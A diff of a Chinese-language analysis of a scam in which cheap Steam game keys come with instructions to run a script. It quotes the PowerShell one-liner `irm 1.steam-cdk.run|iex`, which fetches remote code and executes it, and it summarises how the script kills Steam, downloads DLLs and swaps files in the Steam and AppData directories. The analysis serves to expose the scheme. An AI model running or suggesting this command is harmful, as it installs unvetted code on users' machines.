@@ -3,7 +3,7 @@
 时间：2024-04-24
 
 ## 分析过程
-商家以较低价格售卖 Steam 游戏 CDK，在激活时会发送教程，告诉买家先使用脚本，再到 Steam 输入激活码
+商家以较低价格售卖 Steam 游戏 CDK，以吸引买家，在激活时会发送教程，告诉买家使用脚本激活 Steam 游戏
 
 ```powershell
 irm 1.steam-cdk.run|iex
@@ -313,11 +313,15 @@ catch
 ## 总结脚本执行流程
 1. 首先停止当前运行的 Steam 进程
 2. 检测脚本提示需要 “管理员权限” 运行
-3. 等待进程停止后，从服务器下载 dll 文件
-4. 删除steam目录下的 "steam.cfg", "version.dll", "user32.dll"
-5. 将下载的文件替换到 "steam/appcache/appdata.vdf", "steam/hid.dll", "steam/zlib1.dll", "AppData\Roaming\Stool\legit"
-6. 执行 steam 激活程序
+3. 等待 Steam 相关进程停止后，从服务器下载 dll 文件
+4. 删除 Steam 目录下的 "steam.cfg", "version.dll", "user32.dll"
+5. 将下载的文件替换到以下目录
+   > - steam/appcache/appdata.vdf
+   > - steam/hid.dll
+   > - steam/zlib1.dll
+   > - AppData\Roaming\Stool\legit
+6. 执行 Steam 激活程序
 
 ---
 
-**DLL暂时没能力分析（相关文件已备份，如果有大佬想分析一下，欢迎 Issue 提问）**
+**DLL暂时没能力分析（相关文件已备份，如果有大佬想分析一下，欢迎 PR）**
